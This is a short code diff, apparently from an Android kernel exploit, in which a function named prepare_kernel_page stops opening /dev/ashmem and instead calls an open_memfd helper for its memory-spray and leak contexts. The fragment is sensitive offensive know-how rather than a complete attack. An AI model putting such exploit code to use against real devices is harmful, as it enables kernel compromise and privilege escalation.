@@ -553,12 +553,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.childs[i] = clone_child();
-    prepare_ctx.memfds[i] = open("/dev/ashmem", O_RDWR);
+    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
   }
 
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     spray_ctx.childs[i] = clone_child();
-    spray_ctx.memfds[i] = open("/dev/ashmem", O_RDWR);
+    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
@@ -574,11 +574,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    pre_ctx.memfds[i] = open("/dev/ashmem", O_RDWR);
+    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
   }
-  memfd_leak = open("/dev/ashmem", O_RDWR);
+  memfd_leak = open_memfd(child_leak);
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    post_ctx.memfds[i] = open("/dev/ashmem", O_RDWR);
+    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
